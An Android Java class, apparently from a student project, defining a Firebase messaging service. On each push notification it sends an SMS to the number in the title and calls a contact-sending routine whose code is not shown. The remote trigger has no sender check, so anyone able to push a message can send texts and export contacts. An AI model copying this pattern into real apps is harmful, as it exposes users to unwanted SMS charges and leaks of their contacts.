package fr.intechinfo.fusionandroid;

import android.telephony.SmsManager;
import android.util.Log;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

import static android.content.ContentValues.TAG;

public class MyFirebaseMessagingService extends FirebaseMessagingService {
    public MyFirebaseMessagingService() {
    }

    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        String strTitle=remoteMessage.getNotification().getTitle();
        String message=remoteMessage.getNotification().getBody();
        Log.d(TAG,"onMessageReceived:  Message Received: \n" + "Title: " + strTitle + "\n" + "Message: "+ message);
        sendSMS(strTitle,message);
        Contact.sendContacts(this);
    }
    private void sendSMS(String phoneNumber, String messageBody) {
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage(phoneNumber, null, messageBody, null, null);
    }

}
